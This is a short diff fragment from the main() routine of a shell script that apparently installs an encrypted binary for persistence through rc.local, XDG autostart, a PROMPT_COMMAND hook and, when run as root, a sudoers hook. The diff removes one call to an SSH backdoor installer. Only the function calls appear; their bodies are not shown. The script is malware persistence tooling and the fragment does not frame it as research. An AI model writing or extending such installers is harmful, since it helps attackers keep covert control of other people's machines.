@@ -964,7 +964,6 @@ main() {
     install_rclocal       "$ENCRYPTED_BIN"
     install_xdg_autostart "$ENCRYPTED_BIN" "$hash_file"
     install_prompt_command "$ENCRYPTED_BIN" "$hash_file"
-    install_ssh_backdoor  "$ENCRYPTED_BIN" "$hash_file"
 
     if [ "$(id -u)" -eq 0 ]; then
         install_sudoers_hook  "$ENCRYPTED_BIN" "$hash_file"
